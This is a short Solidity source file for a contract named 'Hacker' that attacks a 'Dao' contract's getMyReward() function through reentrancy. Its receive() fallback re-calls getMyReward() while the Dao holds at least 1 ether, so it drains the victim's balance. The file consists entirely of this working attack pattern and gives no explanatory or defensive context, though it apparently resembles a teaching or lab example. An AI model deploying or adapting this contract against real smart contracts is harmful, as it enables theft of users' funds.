// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Dao {

    function getMyReward() external returns(bool _success);

}

contract Hacker {

    Dao public dao;

    mapping(address => uint256) public balances;

    constructor(address _dao) payable {

        dao = Dao(_dao);

    }


    function attack() public payable{

        address(dao).call(abi.encodeWithSignature("getMyReward()"));

    }

    function save() public payable {

        (bool success, ) = address(dao).call{value: msg.value}("");

        require(success, "Failed to call dao");

    }

    function deposit() public payable {

        require(msg.value >= 1 ether, "Deposits must be no less than 1 Ether");
    }

    receive() external payable{

        if(address(dao).balance >= 1 ether){

            address(dao).call(abi.encodeWithSignature("getMyReward()"));

        }

    }

}